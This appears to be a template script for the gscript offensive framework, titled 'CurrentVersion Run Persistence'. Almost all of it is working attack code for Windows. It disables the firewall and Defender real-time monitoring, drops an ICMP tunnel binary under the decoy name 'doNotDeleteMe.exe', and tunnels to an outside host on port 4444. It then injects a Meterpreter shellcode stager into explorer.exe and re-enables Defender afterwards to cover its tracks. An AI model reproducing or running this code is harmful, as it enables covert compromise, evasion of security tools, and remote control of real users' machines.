// Example gscript template
// Title: CurrentVersion Run Persistence
// Author: Vyrus
// Purpose:
//		-Check if windows defender is running
//		-If it is, dissable it
//		-Drop / run ICMP tunnel
//		-Download stageless meterpreter payload via HTTPS / ICMP
//		-Inject meterpreter into explore.exe
// Gscript version: 1.0.0

//go_import:github.com/gen0cide/gscript/x/windows as windows
//import:ptunnel.exe
//import:cygwin1.dll
//import:payload

var ptun = "C:\\Windows\\Temp\\doNotDeleteMe.exe"
var cygdll = "C:\\Windows\\Temp\\cygwin1.dll"
var ptunHost = "192.168.0.21"
var ptunPort = "4444"

function checkErr(err) {
	if (err[3] != 0) {
		console.log(err[1])
		console.log(err[2])
		DebugConsole()
		return true
	}
	return false
}

function checkErrAsyncCmd(err) {
	if (err[1] != undefined) {
		console.log(err[1])
	}
}

function checkErrString(err) {
	if (err) {
		console.log(err)
		return true
	}
	return false
}

function Deploy() {
	// turn off firewall
    console.log("Starting Disable Windows Firewall");
    var cmdResult = G.exec.ExecuteCommand("netsh", ["advfirewall", "set", "allprofiles", "state", "off"]);
    if (checkErr(cmdResult)) return false
    console.log("Done Disable Windows Firewall");

    // check if defender is on
    wasDefenderOnWhenWeStarted = false
    cmdResult = G.exec.ExecuteCommand("powershell.exe", ["MpComputerStatus"]);
    if (checkErr(cmdResult)) return false
	var cmdLines = cmdResult[1].split('\n');
	for(var cmdLinesIndex = 0; cmdLinesIndex < cmdLines.length; cmdLinesIndex++) {
		if (cmdLines[cmdLinesIndex].indexOf("RealTimeProtectionEnabled") !== -1) {
			if (cmdLines[cmdLinesIndex].indexOf("True") !== -1)	{
				wasDefenderOnWhenWeStarted = true
			}
		}
	}

	// turn defender off
	if (wasDefenderOnWhenWeStarted) {
		cmdResult = G.exec.ExecuteCommand("powershell.exe", ["Set-MpPreference -DisableRealtimeMonitoring $true"]); // this has to be done as admin in order to work
    	if (checkErr(cmdResult)) return false;
	}

    // drop ptun
	console.log("Dropping the icmp tunnel binary...");
	cmdResult = G.file.WriteFileFromBytes(ptun,  GetAssetAsBytes("ptunnel.exe")[0]); // this is horrible err handeling
	if (checkErrString(cmdResult)) return false;

	console.log("Dropping the icmp tunnel DLL...");
	cmdResult = G.file.WriteFileFromBytes(cygdll, GetAssetAsBytes("cygwin1.dll")[0]); // this is horrible err handeling
	if (checkErrString(cmdResult)) return false;

	// run ptun
	console.log("Starting icmp tunnel...");
	cmdResult = G.exec.ExecuteCommandAsync(ptun, ["-p", ptunHost, "-lp", "31337", "-da", "127.0.0.1", "-dp", ptunPort]);
    if (checkErrAsyncCmd(cmdResult)) return false;

    // get PID of explore.exe
	console.log("Looking up explorer.exe PID...");
	var cmdResult = G.exec.ExecuteCommand("powershell.exe", ["Get-Process explorer | select -expand id"]);
    if (checkErr(cmdResult)) return false;
    console.log("PID found!: " + cmdResult[1].replace(/(\r\n|\n|\r)/gm,""));

    // inject meterpreter
	console.log("Injecting msf shellcode stager into explorer.exe...")
	cmdResult = windows.InjectShellcode(Number(cmdResult[1]),  GetAssetAsBytes("payload")[0]);
    if (checkErrString(cmdResult)) return false;

	// turn defender on
	if (wasDefenderOnWhenWeStarted) {
		cmdResult = G.exec.ExecuteCommand("powershell.exe", ["Set-MpPreference -DisableRealtimeMonitoring $false"]); // this has to be done as admin in order to work
	    if (checkErr(cmdResult)) return false;
	}
}
